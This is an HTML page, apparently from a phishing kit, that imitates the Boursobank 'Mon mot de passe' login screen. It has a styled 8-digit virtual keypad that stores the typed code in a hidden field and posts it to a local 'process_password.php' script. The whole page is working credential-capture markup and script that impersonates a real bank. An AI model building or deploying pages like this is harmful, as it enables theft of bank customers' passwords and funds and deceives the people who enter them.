<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boursobank - Mot de Passe</title>
    <style>
        /* Style général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            padding: 20px;
        }

        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 15px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        .password-dots-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin: 15px 0;
        }

        .password-dots div {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #d1d1d1;
        }

        .delete-btn {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 1.2rem;
            color: #ff006f;
        }

        .numpad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            margin: 20px 0;
        }

        .numpad button {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #ffffff;
            border: 1px solid #c0c0c0;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
        }

        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-box">
            <div class="header-bar"></div>
            <h1>Mon mot de passe</h1>
            <form action="process_password.php" method="POST" id="passwordForm">
                <div class="password-dots-container">
                    <div id="passwordDots">
                        <div></div><div></div><div></div><div></div>
                        <div></div><div></div><div></div><div></div>
                    </div>
                    <button type="button" class="delete-btn" onclick="deleteDigit()">✕</button>
                </div>
                <input type="hidden" name="password" id="hiddenPassword">
                <div class="numpad">
                    <button type="button" onclick="addDigit(1)">1</button>
                    <button type="button" onclick="addDigit(2)">2</button>
                    <button type="button" onclick="addDigit(3)">3</button>
                    <button type="button" onclick="addDigit(4)">4</button>
                    <button type="button" onclick="addDigit(5)">5</button>
                    <button type="button" onclick="addDigit(6)">6</button>
                    <button type="button" onclick="addDigit(7)">7</button>
                    <button type="button" onclick="addDigit(8)">8</button>
                    <button type="button" onclick="addDigit(9)">9</button>
                    <button type="button" onclick="addDigit(0)">0</button>
                </div>
                <button type="submit" class="btn">Je me connecte</button>
            </form>
        </div>
    </div>

    <script>
        const passwordDots = document.querySelectorAll("#passwordDots div");
        const hiddenPasswordInput = document.getElementById("hiddenPassword");
        let password = "";

        function addDigit(digit) {
            if (password.length < 8) {
                password += digit;
                passwordDots[password.length - 1].style.backgroundColor = "#000";
                hiddenPasswordInput.value = password;
            }
        }

        function deleteDigit() {
            if (password.length > 0) {
                passwordDots[password.length - 1].style.backgroundColor = "#d1d1d1";
                password = password.slice(0, -1);
                hiddenPasswordInput.value = password;
            }
        }

        document.getElementById("passwordForm").addEventListener("submit", function (e) {
            if (password.length !== 8) {
                e.preventDefault();
                alert("Veuillez entrer un mot de passe à 8 chiffres.");
            }
        });
    </script>
</body>
</html>
